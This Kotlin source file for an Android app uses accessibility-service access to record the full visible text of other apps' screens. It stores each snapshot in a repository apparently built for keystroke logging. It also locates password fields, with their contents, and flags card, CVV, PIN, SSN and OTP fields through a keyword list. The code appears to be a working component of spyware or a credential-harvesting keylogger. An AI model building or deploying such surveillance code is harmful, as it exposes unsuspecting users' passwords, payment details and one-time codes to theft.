package com.android.myapp.capture

import android.graphics.Rect
import android.view.accessibility.AccessibilityNodeInfo
import com.android.myapp.data.VisualTree
import com.android.myapp.data.repository.KeystrokeRepository
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import org.json.JSONArray
import org.json.JSONObject

/**
 * Captures visual tree structure (Android 14+ where screenshots are limited)
 * Creates a textual representation of the screen layout
 */
class VisualTreeCapture(private val repository: KeystrokeRepository) {

    /**
     * Build visual tree from accessibility node
     */
    suspend fun captureVisualTree(
        rootNode: AccessibilityNodeInfo,
        packageName: String
    ) = withContext(Dispatchers.IO) {
        try {
            val visualTree = buildVisualTree(rootNode)

            // Save as JSON for later reconstruction
            val jsonRepresentation = visualTreeToJson(visualTree)

            // Store in database
            saveVisualTree(packageName, jsonRepresentation)

            Timber.d("Visual tree captured for $packageName")
        } catch (e: Exception) {
            Timber.e(e, "Error capturing visual tree")
        }
    }

    private fun buildVisualTree(node: AccessibilityNodeInfo): VisualTree {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)

        val children = mutableListOf<VisualTree>()
        for (i in 0 until node.childCount) {
            try {
                node.getChild(i)?.let { child ->
                    children.add(buildVisualTree(child))
                    child.recycle()
                }
            } catch (e: Exception) {
                Timber.e(e, "Error processing child node")
            }
        }

        return VisualTree(
            bounds = bounds,
            text = node.text?.toString(),
            contentDescription = node.contentDescription?.toString(),
            viewId = node.viewIdResourceName,
            className = node.className?.toString(),
            isPassword = node.isPassword,
            children = children
        )
    }

    private fun visualTreeToJson(tree: VisualTree): String {
        return buildJsonObject(tree).toString(2) // Pretty print with indent 2
    }

    private fun buildJsonObject(tree: VisualTree): JSONObject {
        return JSONObject().apply {
            put("bounds", JSONObject().apply {
                put("left", tree.bounds.left)
                put("top", tree.bounds.top)
                put("right", tree.bounds.right)
                put("bottom", tree.bounds.bottom)
            })
            put("text", tree.text)
            put("contentDescription", tree.contentDescription)
            put("viewId", tree.viewId)
            put("className", tree.className)
            //put("isPassword", tree.isPassword)

            if (tree.children.isNotEmpty()) {
                put("children", JSONArray().apply {
                    tree.children.forEach { child ->
                        put(buildJsonObject(child))
                    }
                })
            }
        }
    }

    private suspend fun saveVisualTree(packageName: String, jsonData: String) {
        // Save as a special event type
        val event = com.android.myapp.data.CapturedEvent(
            timestamp = System.currentTimeMillis(),
            packageName = packageName,
            className = "VisualTree",
            eventType = "visual_tree_snapshot",
            text = jsonData
        )

        repository.saveEvent(event)
    }

    /**
     * Extract all visible text from visual tree
     */
    fun extractAllText(tree: VisualTree): String {
        val textBuilder = StringBuilder()
        extractTextRecursive(tree, textBuilder)
        return textBuilder.toString().trim()
    }

    private fun extractTextRecursive(tree: VisualTree, builder: StringBuilder) {
        tree.text?.let { builder.append(it).append(" ") }
        tree.contentDescription?.let { builder.append(it).append(" ") }

        tree.children.forEach { child ->
            extractTextRecursive(child, builder)
        }
    }

    /**
     * Find password fields in the tree
     */
    fun findPasswordFields(tree: VisualTree): List<PasswordFieldInfo> {
        val passwordFields = mutableListOf<PasswordFieldInfo>()
        findPasswordFieldsRecursive(tree, passwordFields)
        return passwordFields
    }

    private fun findPasswordFieldsRecursive(
        tree: VisualTree,
        result: MutableList<PasswordFieldInfo>
    ) {
        if (tree.isPassword) {
            result.add(
                PasswordFieldInfo(
                    bounds = tree.bounds,
                    viewId = tree.viewId,
                    text = tree.text
                )
            )
        }

        tree.children.forEach { child ->
            findPasswordFieldsRecursive(child, result)
        }
    }

    /**
     * Detect sensitive input fields by heuristics
     */
    fun detectSensitiveFields(tree: VisualTree): List<SensitiveFieldInfo> {
        val sensitiveFields = mutableListOf<SensitiveFieldInfo>()
        detectSensitiveFieldsRecursive(tree, sensitiveFields)
        return sensitiveFields
    }

    private fun detectSensitiveFieldsRecursive(
        tree: VisualTree,
        result: MutableList<SensitiveFieldInfo>
    ) {
        val viewId = tree.viewId?.lowercase() ?: ""
        val contentDesc = tree.contentDescription?.lowercase() ?: ""

        val sensitiveKeywords = listOf(
            "password", "pin", "cvv", "card", "ssn", "credit",
            "security", "secret", "otp", "verification"
        )

        val isSensitive = sensitiveKeywords.any { keyword ->
            viewId.contains(keyword) || contentDesc.contains(keyword)
        } || tree.isPassword

        if (isSensitive) {
            result.add(
                SensitiveFieldInfo(
                    bounds = tree.bounds,
                    viewId = tree.viewId,
                    className = tree.className,
                    isPassword = tree.isPassword,
                    detectedType = detectFieldType(viewId, contentDesc)
                )
            )
        }

        tree.children.forEach { child ->
            detectSensitiveFieldsRecursive(child, result)
        }
    }

    private fun detectFieldType(viewId: String, contentDesc: String): String {
        return when {
            viewId.contains("password") || contentDesc.contains("password") -> "password"
            viewId.contains("pin") || contentDesc.contains("pin") -> "pin"
            viewId.contains("cvv") || contentDesc.contains("cvv") -> "cvv"
            viewId.contains("card") || contentDesc.contains("card") -> "credit_card"
            viewId.contains("otp") || contentDesc.contains("otp") -> "otp"
            else -> "unknown_sensitive"
        }
    }

    data class PasswordFieldInfo(
        val bounds: Rect,
        val viewId: String?,
        val text: String?
    )

    data class SensitiveFieldInfo(
        val bounds: Rect,
        val viewId: String?,
        val className: String?,
        val isPassword: Boolean,
        val detectedType: String
    )
}